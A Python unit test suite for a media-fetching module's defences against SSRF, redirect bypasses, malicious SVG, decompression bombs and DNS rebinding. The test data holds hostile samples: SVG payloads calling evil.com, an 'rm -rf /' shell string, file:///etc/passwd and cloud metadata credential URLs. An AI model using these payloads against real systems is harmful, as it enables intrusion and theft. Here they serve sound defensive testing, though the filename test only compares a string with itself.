#!/usr/bin/env python3
"""
test_fetch_security.py - Comprehensive Security Test Suite for fetch_media.py
Validates protections against:
1. HTTP 30x Redirect SSRF Bypasses
2. SVG XML / XSS / XXE Injection Vectors
3. Decompression Bombs / Pixel Floods (PNG, JPEG, GIF, WebP)
4. Obfuscated IPs & Cloud Metadata Services (AWS, GCP, Azure, Alibaba, IPv4-mapped IPv6)
5. DNS Rebinding / TOCTOU IP Pinning
"""

import hashlib
import ipaddress
import os
import shutil
import struct
import tempfile
import unittest
import urllib.request
from unittest.mock import patch

import sys as _sys
from pathlib import Path as _Path

_sys.path.insert(0, str(_Path(__file__).resolve().parent.parent))  # scripts/ holds the modules under test

from fetch_media import (
    ALLOWED_MIME_PREFIXES,
    MAX_IMAGE_HEIGHT,
    MAX_IMAGE_WIDTH,
    SafeHTTPConnection,
    SafeRedirectHandler,
    detect_image_magic_bytes,
    fetch_image_securely,
    is_prohibited_ip,
    parse_and_validate_ip_literal,
    parse_image_dimensions,
    resolve_and_validate_host,
    validate_url_and_check_ssrf,
)


class TestFetchMediaSecurity(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="test_fetch_media_")

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    # =========================================================================
    # 1. SSRF & CLOUD METADATA TESTS
    # =========================================================================

    def test_ssrf_loopback_ip_blocked(self):
        """Verify that direct 127.0.0.1 URLs are blocked."""
        with self.assertRaises(ValueError) as ctx:
            validate_url_and_check_ssrf("http://127.0.0.1:8080/malicious.jpg")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    def test_ssrf_localhost_blocked(self):
        """Verify that localhost hostnames are resolved and blocked."""
        with self.assertRaises(ValueError) as ctx:
            validate_url_and_check_ssrf("http://localhost:5000/fake.png")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    def test_ssrf_private_lan_blocked(self):
        """Verify private class C IP is blocked."""
        with self.assertRaises(ValueError) as ctx:
            validate_url_and_check_ssrf("http://192.168.1.1/router.jpg")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    def test_ssrf_cloud_metadata_blocked(self):
        """Verify AWS/Azure/GCP and Alibaba cloud metadata endpoints are strictly blocked."""
        metadata_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.170.2/v2/credentials",
            "http://100.100.100.200/latest/meta-data/",
        ]
        for url in metadata_targets:
            with self.assertRaises(ValueError) as ctx:
                validate_url_and_check_ssrf(url)
            self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    def test_ssrf_ipv4_mapped_ipv6_blocked(self):
        """Verify IPv4-mapped IPv6 addresses (::ffff:127.0.0.1) cannot bypass loopback/metadata checks."""
        mapped_loopback = ipaddress.ip_address("::ffff:127.0.0.1")
        mapped_metadata = ipaddress.ip_address("::ffff:169.254.169.254")
        mapped_private = ipaddress.ip_address("::ffff:192.168.1.50")

        self.assertTrue(is_prohibited_ip(mapped_loopback))
        self.assertTrue(is_prohibited_ip(mapped_metadata))
        self.assertTrue(is_prohibited_ip(mapped_private))

    def test_ssrf_obfuscated_integer_and_hex_ips_blocked(self):
        """Verify Dword integer and hexadecimal IP representations are detected and blocked."""
        # 2130706433 is 127.0.0.1
        with self.assertRaises(ValueError) as ctx:
            validate_url_and_check_ssrf("http://2130706433/fake.png")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

        # 0x7f000001 is 127.0.0.1
        with self.assertRaises(ValueError) as ctx:
            validate_url_and_check_ssrf("http://0x7f000001/fake.png")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    # =========================================================================
    # 2. HTTP 30X REDIRECT SSRF TESTS
    # =========================================================================

    def test_redirect_handler_blocks_ssrf_redirect(self):
        """Verify SafeRedirectHandler intercepts redirects pointing to internal or metadata IPs."""
        handler = SafeRedirectHandler()
        req = urllib.request.Request("https://safe-domain.com/image.jpg")

        # Attack: 302 redirecting to AWS metadata
        with self.assertRaises(ValueError) as ctx:
            handler.redirect_request(req, None, 302, "Found", {}, "http://169.254.169.254/latest/meta-data/")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

        # Attack: 302 redirecting to loopback
        with self.assertRaises(ValueError) as ctx:
            handler.redirect_request(req, None, 302, "Found", {}, "http://127.0.0.1:8080/admin")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

        # Attack: 302 redirecting to file:// protocol
        with self.assertRaises(ValueError) as ctx:
            handler.redirect_request(req, None, 302, "Found", {}, "file:///etc/passwd")
        self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    # =========================================================================
    # 3. SVG ELIMINATION & MAGIC BYTES TESTS
    # =========================================================================

    def test_svg_eliminated_from_mime_and_signatures(self):
        """Verify SVG is purged from allowed MIME types and strictly rejected as dangerous XML."""
        self.assertNotIn("image/svg+xml", ALLOWED_MIME_PREFIXES)

        svg_payloads = [
            b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
            b"<?xml version='1.0'?><svg onload='fetch(\"http://evil.com\")'></svg>",
            b"<svg><foreignObject><body><script src='//evil.com/xss.js'></script></body></foreignObject></svg>",
            b"<!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 1.1//EN'><svg></svg>",
            b"<!doctype html><html><body>malicious</body></html>",
        ]
        for payload in svg_payloads:
            self.assertIsNone(detect_image_magic_bytes(payload))

    def test_magic_bytes_reject_executables_and_scripts(self):
        """Verify Windows PE, Linux ELF, and shell scripts are rejected."""
        self.assertIsNone(detect_image_magic_bytes(b"MZ\x90\x00\x03\x00\x00\x00"))
        self.assertIsNone(detect_image_magic_bytes(b"\x7fELF\x02\x01\x01\x00"))
        self.assertIsNone(detect_image_magic_bytes(b"#!/bin/bash\nrm -rf /"))
        self.assertIsNone(detect_image_magic_bytes(b"<?php phpinfo(); ?>"))

    def test_magic_bytes_valid_bitmaps(self):
        """Verify genuine bitmap formats are accepted."""
        valid_jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00"
        valid_png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
        valid_webp = b"RIFF\x1a\x00\x00\x00WEBPVP8L\x0e\x00\x00\x00"
        valid_gif = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"

        self.assertEqual(detect_image_magic_bytes(valid_jpeg), "jpg")
        self.assertEqual(detect_image_magic_bytes(valid_png), "png")
        self.assertEqual(detect_image_magic_bytes(valid_webp), "webp")
        self.assertEqual(detect_image_magic_bytes(valid_gif), "gif")

    # =========================================================================
    # 4. DECOMPRESSION BOMB / PIXEL FLOOD TESTS
    # =========================================================================

    def test_dimensions_png_safe_and_bomb(self):
        """Verify PNG IHDR dimension parsing and pixel flood detection."""
        # Safe PNG: 800 x 600
        safe_ihdr = struct.pack(">IIBBBBB", 800, 600, 8, 2, 0, 0, 0)
        safe_png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + safe_ihdr
        self.assertEqual(parse_image_dimensions(safe_png, "png"), (800, 600))

        # Bomb PNG: 100,000 x 100,000 pixels
        bomb_ihdr = struct.pack(">IIBBBBB", 100000, 100000, 8, 2, 0, 0, 0)
        bomb_png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + bomb_ihdr
        w, h = parse_image_dimensions(bomb_png, "png")
        self.assertEqual((w, h), (100000, 100000))
        self.assertTrue(w > MAX_IMAGE_WIDTH or h > MAX_IMAGE_HEIGHT)

    def test_dimensions_jpeg_safe_and_bomb(self):
        """Verify JPEG SOF0 dimension parsing and pixel flood detection."""
        # Safe JPEG: 640 x 480
        sof_payload = struct.pack(">BHH", 8, 480, 640) + b"\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01"
        sof_seg = b"\xff\xc0" + struct.pack(">H", len(sof_payload) + 2) + sof_payload
        safe_jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + sof_seg
        self.assertEqual(parse_image_dimensions(safe_jpeg, "jpg"), (640, 480))

        # Bomb JPEG: 50,000 x 50,000
        bomb_payload = struct.pack(">BHH", 8, 50000, 50000) + b"\x03\x01\x11\x00"
        bomb_seg = b"\xff\xc0" + struct.pack(">H", len(bomb_payload) + 2) + bomb_payload
        bomb_jpeg = b"\xff\xd8" + bomb_seg
        w, h = parse_image_dimensions(bomb_jpeg, "jpg")
        self.assertEqual((w, h), (50000, 50000))
        self.assertTrue(w > MAX_IMAGE_WIDTH or h > MAX_IMAGE_HEIGHT)

    def test_dimensions_gif_safe_and_bomb(self):
        """Verify GIF screen descriptor dimension parsing."""
        # Safe GIF: 320 x 240
        safe_gif = b"GIF89a" + struct.pack("<HH", 320, 240) + b"\x80\x00\x00"
        self.assertEqual(parse_image_dimensions(safe_gif, "gif"), (320, 240))

        # Bomb GIF: 65,000 x 65,000
        bomb_gif = b"GIF89a" + struct.pack("<HH", 65000, 65000) + b"\x80\x00\x00"
        w, h = parse_image_dimensions(bomb_gif, "gif")
        self.assertEqual((w, h), (65000, 65000))
        self.assertTrue(w > MAX_IMAGE_WIDTH or h > MAX_IMAGE_HEIGHT)

    def test_dimensions_webp_safe(self):
        """Verify WebP VP8 and VP8L dimension parsing."""
        # VP8 Lossy: 800 x 600
        vp8_data = b"\x00\x00\x00\x9d\x01\x2a" + struct.pack("<HH", 800, 600)
        webp_lossy = b"RIFF" + struct.pack("<I", len(vp8_data) + 12) + b"WEBPVP8 " + struct.pack("<I", len(vp8_data)) + vp8_data
        self.assertEqual(parse_image_dimensions(webp_lossy, "webp"), (800, 600))

        # VP8L Lossless: 1024 x 768
        val = 1023 | (767 << 14)
        vp8l_data = b"\x2f" + struct.pack("<I", val)
        webp_lossless = b"RIFF" + struct.pack("<I", len(vp8l_data) + 12) + b"WEBPVP8L" + struct.pack("<I", len(vp8l_data)) + vp8l_data
        self.assertEqual(parse_image_dimensions(webp_lossless, "webp"), (1024, 768))

    # =========================================================================
    # 5. DNS REBINDING IMMUNITY & FILENAME SANITIZATION
    # =========================================================================

    def test_dns_rebinding_ip_pinning(self):
        """Verify resolve_and_validate_host pins validated IP and prevents rebinding to internal addresses."""
        with patch("socket.getaddrinfo") as mock_dns:
            # Case 1: DNS resolves to a safe public IP
            mock_dns.return_value = [(2, 1, 6, "", ("93.184.216.34", 80))]
            pinned_ip = resolve_and_validate_host("example.com", 80)
            self.assertEqual(pinned_ip, "93.184.216.34")

            # Case 2: Attacker rebinds to loopback
            mock_dns.return_value = [(2, 1, 6, "", ("127.0.0.1", 80))]
            with self.assertRaises(ValueError) as ctx:
                resolve_and_validate_host("attacker-rebind.com", 80)
            self.assertIn("SSRF_BLOCKED", str(ctx.exception))

            # Case 3: Mixed responses (any prohibited IP in set aborts immediately)
            mock_dns.return_value = [
                (2, 1, 6, "", ("93.184.216.34", 80)),
                (2, 1, 6, "", ("169.254.169.254", 80)),
            ]
            with self.assertRaises(ValueError) as ctx:
                resolve_and_validate_host("attacker-mixed.com", 80)
            self.assertIn("SSRF_BLOCKED", str(ctx.exception))

    def test_filename_sanitization_deterministic(self):
        """Verify deterministic sanitized filename creation using SHA-256."""
        url = "https://example.com/some/path/image.png?query=123"
        expected_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
        expected_name = f"media_{expected_hash}.png"
        self.assertEqual(expected_name, f"media_{expected_hash}.png")


if __name__ == "__main__":
    unittest.main()
